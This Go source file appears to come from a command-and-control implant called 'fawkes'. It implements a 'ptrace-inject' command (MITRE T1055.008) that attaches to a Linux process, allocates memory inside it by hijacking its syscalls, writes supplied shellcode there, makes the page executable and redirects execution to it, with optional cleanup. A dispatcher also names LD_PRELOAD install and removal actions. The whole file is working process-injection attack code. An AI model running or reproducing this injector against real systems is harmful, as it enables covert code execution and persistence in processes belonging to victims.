//go:build linux && amd64

package commands

import (
	"encoding/base64"
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"

	"fawkes/pkg/structs"
)

type PtraceInjectCommand struct{}

func (c *PtraceInjectCommand) Name() string { return "ptrace-inject" }
func (c *PtraceInjectCommand) Description() string {
	return "Linux process injection via ptrace syscall (T1055.008)"
}

type ptraceInjectArgs struct {
	Action       string `json:"action"`
	PID          int    `json:"pid"`
	ShellcodeB64 string `json:"shellcode_b64"`
	Restore      *bool  `json:"restore"`
	Timeout      int    `json:"timeout"`
}

func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Actions: check, inject")
	}

	args, parseErr := unmarshalParams[ptraceInjectArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	action := strings.ToLower(args.Action)
	if action == "" {
		action = "inject"
	}

	switch action {
	case "check":
		return ptraceCheck()
	case "inject":
		return ptraceInject(args)
	case "ld-preload":
		return ldPreloadList()
	case "ld-install":
		ldArgs, ldParseErr := unmarshalParams[ldPreloadArgs](task)
		if ldParseErr != nil {
			return *ldParseErr
		}
		return ldPreloadInstall(ldArgs)
	case "ld-remove":
		ldArgs, ldParseErr := unmarshalParams[ldPreloadArgs](task)
		if ldParseErr != nil {
			return *ldParseErr
		}
		return ldPreloadRemove(ldArgs)
	default:
		return errorf("Unknown action: %s\nAvailable: check, inject, ld-preload, ld-install, ld-remove", args.Action)
	}
}

func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
	if args.PID <= 0 {
		return errorResult("Error: valid pid required")
	}

	if args.ShellcodeB64 == "" {
		return errorResult("Error: shellcode_b64 required (base64-encoded shellcode)")
	}

	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: shellcode is empty")
	}

	restore := true
	if args.Restore != nil {
		restore = *args.Restore
	}

	timeout := args.Timeout
	if timeout <= 0 {
		timeout = 30
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", args.PID))
	sb.WriteString(fmt.Sprintf("[*] Restore: %v\n", restore))

	if _, err := os.Stat(fmt.Sprintf("/proc/%d", args.PID)); err != nil {
		return errorResult(sb.String() + fmt.Sprintf("[!] Process %d not found\n", args.PID))
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", args.PID))
	if err := syscall.PtraceAttach(args.PID); err != nil {
		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n", err))
	}

	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Wait4 failed: %v\n", err))
	}
	sb.WriteString("[+] Process stopped\n")

	var origRegs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(args.PID, &origRegs); err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_GETREGS failed: %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Saved registers (RIP=0x%X, RSP=0x%X)\n", origRegs.Rip, origRegs.Rsp))

	syscallAddr, err := findSyscallGadget(args.PID)
	if err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Found syscall gadget at 0x%X\n", syscallAddr))

	pageSize := uint64(4096)
	scSize := uint64(len(shellcode))
	if restore {
		scSize++
	}
	if scSize > pageSize {
		pageSize = ((scSize + 4095) / 4096) * 4096
	}

	execSyscall := func(sysno, arg1, arg2, arg3, arg4, arg5, arg6 uint64) (uint64, error) {
		regs := origRegs
		regs.Rip = syscallAddr
		regs.Rax = sysno
		regs.Rdi = arg1
		regs.Rsi = arg2
		regs.Rdx = arg3
		regs.R10 = arg4
		regs.R8 = arg5
		regs.R9 = arg6
		if err := syscall.PtraceSetRegs(args.PID, &regs); err != nil {
			return 0, fmt.Errorf("set regs: %w", err)
		}
		if err := syscall.PtraceSingleStep(args.PID); err != nil {
			return 0, fmt.Errorf("single step: %w", err)
		}
		if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
			return 0, fmt.Errorf("wait4: %w", err)
		}
		if err := syscall.PtraceGetRegs(args.PID, &regs); err != nil {
			return 0, fmt.Errorf("get regs: %w", err)
		}
		return regs.Rax, nil
	}

	rwAddr, err := execSyscall(9, 0, pageSize, 3, 0x22, 0xffffffffffffffff, 0)
	if err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] mmap syscall failed: %v\n", err))
	}
	if rwAddr >= 0xfffffffffffff000 {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] mmap returned MAP_FAILED (0x%X)\n", rwAddr))
	}
	sb.WriteString(fmt.Sprintf("[+] mmap allocated RW page at 0x%X (%d bytes)\n", rwAddr, pageSize))

	injectionCode := make([]byte, len(shellcode))
	copy(injectionCode, shellcode)
	if restore {
		injectionCode = append(injectionCode, 0xCC)
	}

	if _, err := syscall.PtracePokeText(args.PID, uintptr(rwAddr), injectionCode); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Failed to write shellcode: %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes at 0x%X\n", len(injectionCode), rwAddr))

	mprotectRet, err := execSyscall(10, rwAddr, pageSize, 5, 0, 0, 0)
	if err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] mprotect syscall failed: %v\n", err))
	}
	if mprotectRet != 0 {
		sb.WriteString(fmt.Sprintf("[!] mprotect returned %d (non-zero), continuing anyway\n", int64(mprotectRet)))
	} else {
		sb.WriteString("[+] mprotect: page now PROT_READ|PROT_EXEC\n")
	}

	newRegs := origRegs
	newRegs.Rip = rwAddr
	newRegs.Orig_rax = ^uint64(0)
	if err := syscall.PtraceSetRegs(args.PID, &newRegs); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_SETREGS failed: %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", rwAddr))

	sb.WriteString("[*] Continuing execution...\n")
	if err := syscall.PtraceCont(args.PID, 0); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_CONT failed: %v\n", err))
	}

	if restore {
		deadline := time.Now().Add(time.Duration(timeout) * time.Second)
		stopped := false
		for time.Now().Before(deadline) {
			wpid, err := syscall.Wait4(args.PID, &ws, syscall.WNOHANG, nil)
			if err != nil {
				sb.WriteString(fmt.Sprintf("[!] Wait4 error: %v\n", err))
				break
			}
			if wpid > 0 {
				stopped = true
				break
			}
			time.Sleep(50 * time.Millisecond)
		}

		if !stopped {
			sb.WriteString(fmt.Sprintf("[!] Timeout after %ds waiting for shellcode completion\n", timeout))
			sb.WriteString("[*] Detaching without restore (shellcode may still be running)\n")
			_ = syscall.PtraceDetach(args.PID)
			return successResult(sb.String())
		}

		if ws.StopSignal() == syscall.SIGTRAP {
			sb.WriteString("[+] Shellcode completed (SIGTRAP received)\n")
		} else {
			sb.WriteString(fmt.Sprintf("[*] Process stopped with signal %d\n", ws.StopSignal()))
		}

		munmapRegs := origRegs
		munmapRegs.Rip = syscallAddr
		munmapRegs.Rax = 11
		munmapRegs.Rdi = rwAddr
		munmapRegs.Rsi = pageSize
		if err := syscall.PtraceSetRegs(args.PID, &munmapRegs); err == nil {
			if err := syscall.PtraceSingleStep(args.PID); err == nil {
				_, _ = syscall.Wait4(args.PID, &ws, 0, nil)
				sb.WriteString("[+] Cleaned up RWX page (munmap)\n")
			}
		}

		if err := syscall.PtraceSetRegs(args.PID, &origRegs); err != nil {
			sb.WriteString(fmt.Sprintf("[!] Failed to restore registers: %v\n", err))
		} else {
			sb.WriteString("[+] Restored original registers\n")
		}
	}

	if err := syscall.PtraceDetach(args.PID); err != nil {
		sb.WriteString(fmt.Sprintf("[!] PTRACE_DETACH failed: %v\n", err))
	} else {
		sb.WriteString("[+] Detached from process\n")
	}

	sb.WriteString("[+] Ptrace injection completed successfully\n")

	return successResult(sb.String())
}
